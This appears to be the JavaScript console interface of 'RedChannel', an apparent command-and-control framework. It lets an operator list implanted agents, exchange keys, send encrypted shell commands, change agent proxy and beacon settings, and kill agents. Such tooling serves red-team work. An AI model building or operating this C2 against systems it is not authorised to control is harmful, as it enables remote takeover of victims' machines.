const chalk = require("chalk");
const cli_table = require("cli-table");
const readline = require("readline");
const fs = require("fs");

class RedChannelUI {
    constructor(redchannel, crypto) {
        this.redchannel = redchannel;
        this.crypto = crypto;

        this.console = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            completer: this.completer_handler.bind(this),
        });
        this.console.on("line", this.input_handler.bind(this));
    }

    show_agents() {
        // this.info("agents:");
        var rows = [];
        Object.keys(this.redchannel.agents).forEach((a) => {
            const agent = this.redchannel.agents[a];
            var agent_secret = agent.secret != null ? agent.secret.toString("hex") : "n/a";
            // prettier-ignore
            rows.push([
                chalk.blue(agent.ident), 
                agent.ip, 
                agent.channel, 
                chalk.greenBright(agent_secret), 
                new Date(agent.lastseen * 1000).toLocaleString()
            ]);
        });

        this.display_table(["id", "src", "channel", "secret", "lastseen"], rows);
    }

    show_help(help_module) {
        this.info(`${help_module} commands:`);

        var rows = [];
        Object.keys(this.redchannel.commands[help_module]).forEach((cmd) => {
            rows.push([chalk.yellow(cmd), chalk.red(this.redchannel.commands[help_module][cmd]["params"].join(" ")), chalk.yellow(this.redchannel.commands[help_module][cmd]["desc"])]);
        });
        if (this.redchannel.using_module) {
            Object.keys(this.redchannel.commands.module_common).forEach((cmd) => {
                rows.push([chalk.yellow(cmd), chalk.red(this.redchannel.commands.module_common[cmd]["params"].join(" ")), chalk.yellow(this.redchannel.commands.module_common[cmd]["desc"])]);
            });
        }

        this.display_table(["command", "params", "description"], rows);
    }

    display_table(columns, rows) {
        const table = new cli_table({
            head: columns,
        });
        rows.forEach((row) => {
            table.push(row);
        });
        this.echo(chalk.gray(table.toString()));
    }

    completer_handler(line) {
        var completions = [];

        var command = line.split(" ")[0];
        if (command == "interact" || command == "kill") {
            completions = this.redchannel.get_all_agents(command + " ");
        } else {
            if (this.redchannel.agent.interact) {
                completions = Object.keys(this.redchannel.commands.agent);
            } else if (this.redchannel.using_module) {
                completions = Object.keys(this.redchannel.commands[this.redchannel.using_module]);
                completions = completions.concat(Object.keys(this.redchannel.commands.module_common));
            } else {
                completions = Object.keys(this.redchannel.commands.c2);
            }
        }

        var hits = completions.filter((c) => c.startsWith(line));
        return [hits, line];
    }

    input_handler(input) {
        if (!input.replace(/ /g, "")) {
            this.reset_prompt();
            return;
        }

        var param = input.split(" ");
        var command = param.shift();

        if (this.redchannel.agent.interact) {
            switch (command) {
                case "debug":
                    this.redchannel.config.debug = !this.redchannel.config.debug;
                    this.warn(`debug ${this.redchannel.config.debug ? "enabled" : "disabled"}`);
                    break;
                case "back":
                    this.redchannel.agent.interact = null;
                    this.reset_prompt();
                    break;
                case "help":
                    this.show_help("agent");
                    break;
                case "sysinfo":
                    if (!this.redchannel.agent.interact.secret) {
                        this.error(`cannot send sysinfo to ${chalk.blue(this.redchannel.agent.interact.ident)}, start 'keyx' first`);
                        break;
                    }

                    // agent must be able to decrypt tag buffer to execute command
                    var buffer = Buffer.from(this.crypto.libcrypto.randomBytes(6).toString("hex"));
                    var tag = this.crypto.encrypt_buffer(buffer, this.redchannel.agent.interact.secret);

                    this.info(`requesting sysinfo from ${chalk.blue(this.redchannel.agent.interact.ident)}`);
                    this.redchannel.command_sysinfo(tag);
                    break;
                case "interact":
                    var with_who = param.shift();

                    if (typeof with_who == "undefined" || with_who.length == 0) {
                        this.error("please specify an agent id, see 'agents'");
                        break;
                    }

                    this.redchannel.agent.interact = this.redchannel.get_agent(with_who);
                    if (!this.redchannel.agent.interact) {
                        this.error("agent '" + chalk.blue(this.redchannel.agent.interact ? with_who : "") + "' not found");
                    } else {
                        this.warn("interacting with " + chalk.blue(this.redchannel.agent.interact.ident));
                        this.reset_prompt();
                    }
                    break;
                case "agents":
                    this.show_agents();
                    break;
                case "shutdown":
                    if (!this.redchannel.agent.interact.secret) {
                        this.error("cannot send shutdown to " + chalk.blue(this.redchannel.agent.interact.ident) + ", start 'keyx' first");
                        break;
                    }

                    var shutdown_who = param.shift();
                    if (shutdown_who !== this.redchannel.agent.interact.ident) {
                        this.warn("please confirm shutdown by entering the agent id, see 'help'");
                        break;
                    }

                    // agent must be able to decrypt tag buffer to execute command
                    var buffer = Buffer.from(this.crypto.libcrypto.randomBytes(6).toString("hex"));
                    var tag = this.crypto.encrypt_buffer(buffer, this.redchannel.agent.interact.secret);

                    this.warn("sending shutdown command to " + chalk.blue(this.redchannel.agent.interact.ident));
                    this.redchannel.command_shutdown(tag);
                    break;
                case "shell":
                case "exec_cmd":
                    if (!this.redchannel.agent.interact.secret) {
                        this.error("cannot send command to " + chalk.blue(this.redchannel.agent.interact.ident) + ", start 'keyx' first");
                        break;
                    }

                    var cmd = param.join(" ");
                    if (cmd.length == 0) {
                        this.error("command failed, insufficient parameters, see 'help'");
                        break;
                    }

                    var buffer = Buffer.from(cmd);
                    var payload = this.crypto.encrypt_buffer(buffer, this.redchannel.agent.interact.secret);

                    this.warn("sending shell command to " + chalk.blue(this.redchannel.agent.interact.ident) + "");
                    this.redchannel.command_shell(payload);
                    break;
                case "set":
                    if (!this.redchannel.agent.interact.secret) {
                        this.error("cannot send config to " + chalk.blue(this.redchannel.agent.interact.ident) + ", start 'keyx' first");
                        break;
                    }

                    var setting = param.shift();
                    var agent_settings = {
                        // domain: this.redchannel.config.c2.domain, // cannot set these dynamically
                        // password: this.redchannel.config.c2.password, // cannot set these dynamically
                        interval: this.redchannel.config.c2.interval,
                        proxy_enabled: this.redchannel.config.proxy.enabled,
                        proxy_url: this.redchannel.config.proxy.url,
                        proxy_key: this.redchannel.config.proxy.key,
                    };

                    var config_name_map = {
                        domain: "d",
                        interval: "i",
                        password: "p",
                        proxy_enabled: "pe",
                        proxy_url: "pu",
                        proxy_key: "pk",
                    };

                    if (!Object.keys(agent_settings).includes(setting)) {
                        this.error("invalid config setting, see 'help'");
                        break;
                    }

                    var value = param.join(" ");
                    if (value.length === 0) {
                        this.error("please specify config setting value, see 'help'");
                        break;
                    }

                    // TODO: regex validate value
                    var setting_type = typeof agent_settings[setting];
                    switch (setting_type) {
                        case "boolean":
                            value = ["off", "0", "false", "no"].includes(value) ? "false" : "true";
                            break;
                        default:
                            // numbers, strings, etc
                            break;
                    }

                    var data = config_name_map[setting] + "=" + value;

                    var buffer = Buffer.from(data);
                    var payload = this.crypto.encrypt_buffer(buffer, this.redchannel.agent.interact.secret);

                    // if changing the c2 password, issue keyx again
                    this.success("setting '" + config_name_map[setting] + "' to value '" + value + "' on agent: " + this.redchannel.agent.interact.ident);
                    this.redchannel.command_set_config(payload);
                    break;
                case "keyx":
                    if (!this.crypto.key) {
                        this.crypto.generate_keys();
                    }

                    this.warn("keyx started with agent " + chalk.blue(this.redchannel.agent.interact.ident));
                    this.redchannel.command_keyx(this.crypto.export_pubkey("uncompressed"), this.redchannel.agent.interact.ident);
                    break;
                case "msg":
                    if (!this.redchannel.agent.interact.secret) {
                        this.error("cannot send msg to " + chalk.blue(this.redchannel.agent.interact.ident) + ", start 'keyx' first");
                        break;
                    }

                    var message = param.join(" ");
                    var buffer = Buffer.from(message);
                    var payload = this.crypto.encrypt_buffer(buffer, this.redchannel.agent.interact.secret);

                    this.warn("sending message to " + chalk.blue(this.redchannel.agent.interact.ident) + "");
                    this.redchannel.queue_data(this.redchannel.agent.interact.ident, this.redchannel.AGENT_MSG, payload);
                    break;
                default:
                    this.error("invalid command: " + command + ", see 'help'");
                    break;
            }
        } else if (this.redchannel.using_module.length > 0) {
            var n = this.redchannel.using_module;
            switch (command) {
                case "reload":
                case "reset":
                    var conf_object = JSON.parse(fs.readFileSync(this.redchannel.config_file).toString());
                    this.redchannel.config[n] = conf_object[n];
                    this.info("module configuration reset, see 'config'");
                    break;
                case "ls":
                case "info":
                case "config":
                    this.info("module config:");
                    this.info(JSON.stringify(this.redchannel.config[n], null, "  "));
                    break;
                case "help":
                    this.show_help(n);
                    break;
                case "back":
                    this.redchannel.using_module = "";
                    this.reset_prompt();
                    break;
                case "set":
                    var setting = param.shift();
                    var setting_type = typeof this.redchannel.config[n][setting];
                    if (setting_type === "undefined") {
                        this.error("unknown module setting '" + setting + "', see 'help'");
                        break;
                    }

                    var p = param.join(" ");
                    if (p.length === 0) {
                        this.error("please specify setting value, see 'help'");
                        break;
                    }

                    // get the help object for the command (for set, its 'set property')
                    var command_help = this.redchannel.commands[n][command + " " + setting];
                    if (command_help.validate_regex && command_help.validate_regex.test instanceof Function && !command_help.validate_regex.test(p)) {
                        this.error("invalid setting value, see 'help'");
                        break;
                    }
                    switch (setting_type) {
                        case "number":
                            this.redchannel.config[n][setting] = parseInt(p);
                            break;
                        case "boolean":
                            this.redchannel.config[n][setting] = ["off", "0", "false", "no"].includes(p) ? false : true;
                            break;
                        case "object":
                            this.redchannel.config[n][setting] = p.split(",");
                            break;
                        default:
                            this.redchannel.config[n][setting] = p;
                            break;
                    }
                    this.info("set " + setting + " = '" + this.redchannel.config[n][setting] + "'");

                    if (typeof this.redchannel.modules[n].actions[command + " " + setting] === "function") {
                        // call it with this.redchannel as first param
                        let ret = this.redchannel.modules[n].actions[command + " " + setting].bind(this.redchannel)(param);
                        if (ret.error) this.error(ret.message);
                        if (!ret.error && ret.message.length > 0) this.info(ret.message);
                    }

                    break;
                default:
                    // is the command a module action?
                    if (typeof this.redchannel.modules[n].actions[command] === "function") {
                        // call it with this.redchannel as first param
                        let ret = this.redchannel.modules[n].actions[command].bind(this.redchannel)(param);
                        if (ret.error) this.error(ret.message);
                        if (!ret.error && ret.message.length > 0) this.info(ret.message);
                        break;
                    }
                    this.error("invalid command: " + command + ", see 'help'");
                    break;
            }
        } else {
            // main menu
            switch (command) {
                case "debug":
                    this.redchannel.config.debug = !this.redchannel.config.debug;
                    this.warn("debug " + (this.redchannel.config.debug ? "enabled" : "disabled"));
                    break;
                case "interact":
                    var with_who = param.shift();

                    if (typeof with_who == "undefined" || with_who.length == 0) {
                        this.error("please specify an agent id, see 'agents'");
                        break;
                    }

                    this.redchannel.agent.interact = this.redchannel.get_agent(with_who);
                    if (!this.redchannel.agent.interact) {
                        this.error("agent " + chalk.blue(with_who) + " not found");
                    } else {
                        this.info("interacting with " + chalk.blue(this.redchannel.agent.interact.ident) + "");
                    }
                    break;
                case "keyx":
                    if (!this.crypto.key) {
                        this.crypto.generate_keys();
                    }

                    this.warn("keyx started with all agents");
                    this.redchannel.command_keyx(this.crypto.export_pubkey("uncompressed"), null); // null agent id will send broadcast
                    break;
                case "agents":
                    this.show_agents();
                    break;
                case "sysinfo":
                    // TODO: request sysinfo
                    break;
                case "kill":
                    var kill_who = param.shift();

                    if (typeof kill_who == "undefined" || kill_who.length == 0) {
                        this.error("please specify an agent id, see 'agents'");
                        break;
                    }

                    var agent_to_kill = this.redchannel.get_agent(kill_who);
                    if (!agent_to_kill) {
                        this.error("agent " + chalk.blue(kill_who) + " not found");
                    } else {
                        this.warn("killing " + chalk.blue(agent_to_kill.ident) + ", agent may reconnect");
                        this.redchannel.kill_agent(agent_to_kill.ident);
                    }
                    break;
                case "help":
                    this.show_help("c2");
                    break;
                case "use":
                    var module_name = param.shift();
                    if (module_name.length == 0 || typeof this.redchannel.modules[module_name] === "undefined") {
                        this.error("unknown module: '" + module_name + "', see 'help'");
                        break;
                    }
                    this.redchannel.using_module = module_name;
                    this.reset_prompt();
                    break;
                default:
                    this.error("invalid command: " + command + ", see 'help'");
                    break;
            }
        }

        this.reset_prompt();
    }

    error(msg) {
        this.msg(msg, "error");
    }
    warn(msg) {
        this.msg(msg, "warn");
    }
    info(msg) {
        this.msg(msg, "info");
    }
    debug(msg) {
        if (this.redchannel.config.debug) this.msg(msg, "debug");
    }
    success(msg) {
        this.msg(msg, "success");
    }
    echo(msg) {
        this.msg(msg, "echo");
    }
    msg(msg, level = "info") {
        if (process.stdout.clearLine) process.stdout.clearLine();
        if (process.stdout.cursorTo) process.stdout.cursorTo(0);

        switch (level) {
            case "debug":
                console.log(chalk.gray(`* ${msg}`));
                break;
            case "warn":
                console.log(chalk.yellowBright(`* ${msg}`));
                break;
            case "error":
                console.log(chalk.redBright(`! ${msg}`));
                break;
            case "success":
                console.log(chalk.greenBright(`* ${msg}`));
                break;
            case "echo":
                console.log(msg);
                break;
            case "info":
            default:
                console.log(chalk.gray(`* ${msg}`));
                break;
        }
        this.reset_prompt();
    }

    reset_prompt() {
        var prompt = chalk.red("> ");
        if (this.redchannel.agent.interact) {
            this.console.setPrompt(chalk.red("agent(") + chalk.blue(this.redchannel.agent.interact.ident) + chalk.red(")") + prompt);
        } else if (this.redchannel.using_module.length > 0) {
            this.console.setPrompt(this.redchannel.using_module + prompt);
        } else {
            this.console.setPrompt(prompt);
        }
        this.console.prompt(true);
    }
}

module.exports = RedChannelUI;
